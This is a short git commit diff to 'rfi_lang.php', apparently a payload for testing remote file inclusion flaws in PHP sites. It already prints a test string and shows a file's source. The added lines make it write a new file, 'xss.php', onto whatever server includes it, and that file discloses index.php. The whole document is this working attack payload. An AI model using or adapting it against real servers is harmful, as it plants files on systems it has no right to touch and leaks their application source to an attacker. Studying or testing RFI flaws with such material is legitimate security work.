1005757760ad690cf382bc68132a4630bf9f3154
Bun suwanparsert <bun.swp@gmail.com>
2016-10-11 11:31:07 +0700

    Update rfi_lang.php

--- rfi_lang.php
+++ rfi_lang.php
@@ -1,4 +1,9 @@
 <?php 
   echo "Test RFI"; 
   show_source('en_lang.php');
+
+  $myfile = fopen("xss.php", "w") or die("Unable to open file!");
+  $txt = "<?php show_source('index.php'); ?>";
+  fwrite($myfile, $txt);
+  fclose($myfile);
 ?>
